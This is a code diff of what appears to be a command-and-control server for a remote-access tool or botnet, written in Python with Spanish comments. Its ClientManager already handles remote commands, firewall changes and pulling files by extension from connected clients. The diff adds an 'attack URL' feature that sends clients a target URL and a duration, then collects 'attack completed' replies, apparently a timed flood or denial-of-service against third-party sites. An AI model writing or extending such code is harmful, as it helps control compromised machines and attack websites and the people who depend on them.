@@ -8,6 +8,7 @@ from server.handlers.directory_handler import DirectoryHandler
 from server.handlers.file_handler import FileHandler
 from server.handlers.command_handler import CommandHandler
 from server.handlers.firewall_handler import FirewallHandler
+from server.handlers.attack_url_handler import AttackUrlHandler
 
 class ClientManager:
     """Administra clientes conectados y procesa sus respuestas."""
@@ -24,6 +25,7 @@ class ClientManager:
         self.file_handler = FileHandler(self)
         self.command_handler = CommandHandler(self)
         self.firewall_handler = FirewallHandler(self)
+        self.attack_url_handler = AttackUrlHandler(self)
         
     def esperar_respuesta_accion(self, accion, cliente_id=None):
         """Espera la(s) respuesta(s) de uno o varios clientes para una acción dada."""
@@ -91,6 +93,10 @@ class ClientManager:
                 self.file_handler._procesar_archivos_extension_enviados(datos_dict, cliente_id)
                 self.response_waiter.notificar_respuesta(cliente['id'], accion)
                 
+            elif accion == "ataque_completado":
+                self.attack_url_handler._manejar_respuesta_ataque(datos_dict, cliente_id)
+                self.response_waiter.notificar_respuesta(cliente['id'], accion)
+                
         except json.JSONDecodeError:
             self.console.print(f"[bold red][!] Error al decodificar respuesta del cliente: {datos}[/bold red]")
         except Exception as e:
@@ -152,6 +158,11 @@ class ClientManager:
         exito_envio = self.file_handler.enviar_comando_archivos_por_extension(ruta_busqueda, extension, ruta_destino, cliente_id)
         
         return self.comprobar_respuesta(exito_envio, "archivos_extension_enviados", cliente_id)
+    
+    def enviar_comando_attack_url(self, url, tiempo, cliente_id=None):
+        exito_envio = self.attack_url_handler.enviar_comando_attack_url(url, tiempo, cliente_id)
+        
+        return self.comprobar_respuesta(exito_envio, "ataque_completado", cliente_id)
 
     def comprobar_respuesta(self, exito_envio, accion_esperada, cliente_id=None):
         if not exito_envio:
